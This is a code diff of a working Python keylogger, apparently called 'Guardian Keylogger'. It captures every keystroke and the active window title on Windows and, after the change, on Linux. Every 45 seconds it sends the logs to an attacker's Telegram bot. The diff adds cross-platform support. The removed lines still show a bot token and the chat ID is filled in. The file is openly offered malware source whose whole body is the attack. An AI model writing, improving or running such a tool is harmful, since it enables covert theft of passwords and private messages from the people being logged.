@@ -2,48 +2,58 @@ import time
 import threading
 import requests
 import os
+import platform
+import subprocess
 from datetime import datetime
 from pynput import keyboard
-import win32gui
-import win32process
-import psutil
 
 # ============= CONFIG =============
-TELEGRAM_BOT_TOKEN = "8303464927:AAGq6lwHcTsYYOAbDUFkH9YTfHUzFAaq2dU"   # ← Yahan apna bot token daal
-TELEGRAM_CHAT_ID = "-1004320842899"           # ← Yahan apna chat id (hyphen ke saath)
-SEND_INTERVAL = 45                            # seconds mein buffer bhejega (45 recommended)
+TELEGRAM_BOT_TOKEN = "YOUR_BOT_TOKEN_HERE"
+TELEGRAM_CHAT_ID = "-1004320842899"
+SEND_INTERVAL = 45
 # =================================
 
 log_buffer = ""
 last_window = ""
 running = True
+OS_NAME = platform.system()
 
 def get_active_window_title():
+    global OS_NAME
     try:
-        hwnd = win32gui.GetForegroundWindow()
-        if hwnd:
-            title = win32gui.GetWindowText(hwnd)
+        if OS_NAME == "Windows":
+            import win32gui
+            import win32process
+            import psutil
+            hwnd = win32gui.GetForegroundWindow()
+            if hwnd:
+                title = win32gui.GetWindowText(hwnd)
+                try:
+                    _, pid = win32process.GetWindowThreadProcessId(hwnd)
+                    proc = psutil.Process(pid)
+                    return f"{proc.name()} - {title}"
+                except:
+                    return title
+        elif OS_NAME == "Linux":
+            # xdotool for Ubuntu
+            title = subprocess.check_output(["xdotool", "getactivewindow", "getwindowname"], stderr=subprocess.DEVNULL).decode('utf-8').strip()
             try:
-                _, pid = win32process.GetWindowThreadProcessId(hwnd)
-                proc = psutil.Process(pid)
-                app = proc.name()
-                return f"{app} - {title}"
+                pid = subprocess.check_output(["xdotool", "getactivewindow", "getpid"], stderr=subprocess.DEVNULL).decode('utf-8').strip()
+                proc = subprocess.check_output(["ps", "-p", pid, "-o", "comm="], stderr=subprocess.DEVNULL).decode('utf-8').strip()
+                return f"{proc} - {title}"
             except:
                 return title
+        else:
+            return "Unknown OS"
     except:
-        pass
-    return "Unknown"
+        return "Unknown"
 
 def send_to_telegram(message):
     if not message.strip():
         return
     try:
         url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
-        data = {
-            "chat_id": TELEGRAM_CHAT_ID,
-            "text": message,
-            "parse_mode": "HTML"
-        }
+        data = {"chat_id": TELEGRAM_CHAT_ID, "text": message, "parse_mode": "HTML"}
         requests.post(url, data=data, timeout=10)
     except:
         pass
@@ -53,33 +63,27 @@ def flush_buffer():
     while running:
         time.sleep(SEND_INTERVAL)
         if log_buffer.strip():
-            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-            header = f"🕒 <b>{timestamp}</b>\n📱 <b>Window:</b> {last_window or 'N/A'}\n\n"
+            ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+            header = f"🕒 <b>{ts}</b> | {OS_NAME}\n📱 <b>Window:</b> {last_window or 'N/A'}\n\n"
             send_to_telegram(header + log_buffer)
             log_buffer = ""
 
 def on_press(key):
     global log_buffer, last_window
     try:
-        current_window = get_active_window_title()
-        if current_window != last_window and current_window != "Unknown":
-            last_window = current_window
-            log_buffer += f"\n[Window Changed → {current_window}]\n"
+        current = get_active_window_title()
+        if current != last_window and current != "Unknown":
+            last_window = current
+            log_buffer += f"\n[→ Window: {current}]\n"
         
-        if hasattr(key, 'char') and key.char is not None:
+        if hasattr(key, 'char') and key.char:
             log_buffer += key.char
         else:
-            key_name = str(key).replace("Key.", "").upper()
-            if key_name == "SPACE":
-                log_buffer += " "
-            elif key_name == "ENTER":
-                log_buffer += " [ENTER]\n"
-            elif key_name == "BACKSPACE":
-                log_buffer += " [←]"
-            elif key_name in ["CTRL_L", "CTRL_R", "ALT_L", "ALT_R", "SHIFT", "TAB"]:
-                log_buffer += f" [{key_name}]"
-            else:
-                log_buffer += f" [{key_name}]"
+            k = str(key).replace("Key.", "").upper()
+            if k == "SPACE": log_buffer += " "
+            elif k == "ENTER": log_buffer += " [ENTER]\n"
+            elif k == "BACKSPACE": log_buffer += " [←]"
+            else: log_buffer += f" [{k}]"
     except:
         log_buffer += " [?]"
 
@@ -90,10 +94,8 @@ def on_release(key):
         return False
 
 def main():
-    print("Keylogger started... (Esc to stop for testing)")
-    
-    sender_thread = threading.Thread(target=flush_buffer, daemon=True)
-    sender_thread.start()
+    print(f"Guardian Keylogger started on {OS_NAME}... (Esc to stop for testing)")
+    threading.Thread(target=flush_buffer, daemon=True).start()
     
     with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
         listener.join()
